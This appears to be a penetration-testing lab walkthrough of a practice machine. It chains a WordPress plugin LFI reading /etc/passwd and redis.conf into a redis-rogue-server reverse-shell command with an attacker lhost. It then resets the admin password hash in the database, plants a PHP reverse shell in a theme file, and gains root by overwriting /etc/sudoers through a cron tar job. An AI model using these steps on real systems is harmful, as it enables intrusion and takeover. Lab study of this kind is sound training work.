### Enumeration
```
IP=192.168.163.166
sudo nmap -sU $IP
sudo nmap -p- -vv $IP
sudo nmap -p22,80,6379 -A $IP
```
### Ports
- Banner Grab: nc -nv $IP PORT
- 22
	- OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
	- nc -nv $IP 22
		- SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2
- 80
	- Apache httpd 2.4.38 ((Debian))
	- nc -nv $IP 80
		- http
- 6379
	- Redis key-value store
	- nc -nv $IP 6379
		- redis
### Foothold
- 6379
	- redis-cli -h $IP
		- info
			- NOAUTH Authentication required.
			- auth Ready4Redis?
				- OK
	- python3 redis-rogue-server.py --rhost 192.168.163.166 --lhost 192.168.45.195 --lport 21 --passwd='Ready4Redis?'
		- ![[Pasted image 20240718145453.png]]
- 80
	- Default landing page
		- ![[Pasted image 20240718135944.png]]
	- Versions
		- WordPress version 5.7.2
	- Directory Brute force
		- dirsearch -u http://$IP
			- /index.php
			- /license.txt
			- /readme.html
			- /wp-config.php
			- /wp-admin/
			- /wp-admin/install.php
			- /wp-content/
			- /wp-includes/
		- sudo wpscan --url http://192.168.163.166 --enumerate --api-token API_KEY
			- http://192.168.163.166/wp-content/uploads/
			- http://192.168.163.166/wp-cron.php
			- WordPress version 5.7.2
				- sqli
				- XSS
			- twentytwentyone 1.3 theme
			- plugin
				- site-editor 1.1.1
					- LFI
						- exploit-db 44340
						- http://192.168.163.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
							- Writes /etc/passwd
							- alice
							- root
						- Checked wp-config.php
							- nothing interesting
						- /etc/redis/redis.conf
							- Security section
								- requirepass Ready4Redis?
			- Users
				- admin
		- ffuf -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://$IP/FUZZ
		- Found directories
	- Vulnerability scan
		- nikto -h http://$IP
### PE
#### Linux
- redis
	- id
		- uid=107(redis) gid=114(redis) groups=114(redis)
	- sudo -l
		- effective uid is not 0, is sudo installed setuid root?
		- ls -la $(which sudo)
			- /usr/bin/sudo
			- /usr/bin/sudo -l
				- sudo: effective uid is not 0, is /usr/bin/sudo on a file system with the 'nosuid' option set or an NFS file system without root privileges?
		- might be nothing
	- uname -a
		- Linux readys 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64 GNU/Linux
	- getcap -r / 2>/dev/null
		- nothing
	- suid
		- find / -type f -perm -04000 -ls 2>/dev/null
			- nothing
	- Users with console
		- /home  not readable
		- /etc/passwd
			- alice
			- root
	- netstat -ano
		- Active ports
			- 3306
	- linpeas
		- Possible Exploits
			- PTRACE_TRACEME
		- Interesting Files
			- cron
				- `*/3 * * * * root /usr/local/bin/backup.sh`
			- /var/www/html/wp-config.php
				- karl:Wordpress1234
	- SQL
		- mysql -u karl -p
			- Wordpress1234
			- Dbs
				- wordpress
					- wp_users
						- admin:`$P$Ba5uoSB5xsqZ5GFIbBnOkXA0ahSJnb0
					- https://www.forge12.com/en/wordpress-password-generator/
						- admin
					- `UPDATE wp_users SET user_pass ='$P$B/9HfHeP45he1c4MTP3jzJ3f8jCXj/1' WHERE user_login='admin';
					- Updated password
					- Now we can login to wp portal
					- Go into theme editor. Add php rev shell
						- ![[Pasted image 20240718154734.png]]
					- Navigate to 192.168.163.166/wp-content/themes/twentytwentyone/404.php
						- now we have shell as alice
				- information_schema
- alice
	- id
		- uid=1000(alice) gid=1000(alice) groups=1000(alice)
	- sudo -l
		- need password
	- linpeas
		- apache running under me but rooted?
		- cront
			- `*/3 * * * * root /usr/local/bin/backup.sh`
				- cd /var/www/html
				- `tar -cf /opt/backups/website.tar *
					- Tar wild card exploit might work
					- Follow these steps
						- ![[Pasted image 20240718155448.png]]
					- Instead added to sudoers
						- cat <<'EOT'> /var/www/html/privesc.sh
						- echo 'alice ALL=(root) NOPASSWD: ALL' > /etc/sudoers
						- EOT
					- chmod +x privesc.sh
				- Then sudo su
### Credentials
- karl:Wordpress1234
### Lessons Learned